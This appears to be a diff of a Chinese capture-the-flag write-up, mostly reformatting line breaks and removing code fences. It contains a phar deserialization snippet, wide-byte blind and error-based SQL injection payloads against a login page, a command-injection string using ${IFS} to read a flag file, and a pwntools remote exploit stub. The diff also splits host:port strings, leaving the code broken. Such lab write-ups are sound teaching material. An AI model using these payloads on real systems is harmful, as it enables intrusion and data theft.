@@ -43,15 +43,18 @@ $phar->addFromString("test.txt", "test"); //添加要压缩的文件
 $phar->stopBuffering();
 
 POST /login.php HTTP/1.1
-Host: 39.105.13.61:10808
+Host: 39.105.13.61:
+10808
 Content-Length: 72
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://39.105.13.61:10808
+Origin: http://39.105.13.61:
+10808
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://39.105.13.61:10808/login.php
+Referer: http://39.105.13.61:
+10808/login.php
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
@@ -60,10 +63,13 @@ username=admin%df'^(SUBSTRING(select(user()),1,1)<>0x61)#&password=admin
 
 import requests
 
-url = 'http://39.105.13.61:10808/login.php'
+url = 'http://39.105.13.61:
+10808/login.php'
 proxies={
-'http':'127.0.0.1:8080',
-'https':'127.0.0.1:8080'
+'http':'127.0.0.1:
+8080',
+'https':'127.0.0.1:
+8080'
 }
 
 res=''
@@ -81,7 +87,8 @@ for j in range(1, 30):
             break
 报错注入
 
-admin%df' anuniond (exuniontracuniontvalunionue(1,conunioncat(0x7e,(selunionect database()),0x7e)))#
+admin%df' anuniond (exuniontracuniontvalunionue(1,conunioncat(0x7e,(selunionect database()),0x7e)))
+#
 
 解题思路
 
@@ -101,7 +108,8 @@ tac${IFS}fl*
 
 # coding=utf-8
 from pwn import *
-#Sloved By ReStr0#
+#Sloved By ReStr0
+#
 #p = process("./pwn")
 p=remote("101.200.32.152","39876")
 elf = ELF('./pwn')
@@ -211,37 +219,33 @@ $phar->setMetadata($A); //将自定义的meta-data存入manifest
 $phar->addFromString("test.txt", "test"); //添加要压缩的文件
 //签名自动计算
 $phar->stopBuffering();
-```
-
-
-
-```
 POST /login.php HTTP/1.1
-Host: 39.105.13.61:10808
+Host: 39.105.13.61:
+10808
 Content-Length: 72
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://39.105.13.61:10808
+Origin: http://39.105.13.61:
+10808
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://39.105.13.61:10808/login.php
+Referer: http://39.105.13.61:
+10808/login.php
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 
 username=admin%df'^(SUBSTRING(select(user()),1,1)<>0x61)#&password=admin
-```
-
-
-
-```
 import requests
 
-url = 'http://39.105.13.61:10808/login.php'
+url = 'http://39.105.13.61:
+10808/login.php'
 proxies={
-'http':'127.0.0.1:8080',
-'https':'127.0.0.1:8080'
+'http':'127.0.0.1:
+8080',
+'https':'127.0.0.1:
+8080'
 }
 
 res=''
@@ -258,17 +262,8 @@ for j in range(1, 30):
             print(res)
             break
 报错注入
-```
-
-
-
-```
-admin%df' anuniond (exuniontracuniontvalunionue(1,conunioncat(0x7e,(selunionect database()),0x7e)))#
-```
-
-
-
-```
+admin%df' anuniond (exuniontracuniontvalunionue(1,conunioncat(0x7e,(selunionect database()),0x7e)))
+#
 127.0.0.1
 cd${IFS}ky*
 ls
@@ -278,15 +273,11 @@ tac${IFS}fl*
 以上命令url编码后发送就可以读flag：
 
 127.0.0.1%0acd${IFS}ky*%0als%0a%0atac${IFS}fl*
-```
-
-
-
-```
 # coding=utf-8
 from pwn import *
-#Sloved By ReStr0#
-#p = process("./pwn")
+#Sloved By ReStr0
+#
+    #p = process("./pwn")
 p=remote("101.200.32.152","39876")
 elf = ELF('./pwn')
 libc = ELF('./libc-2.23.so')
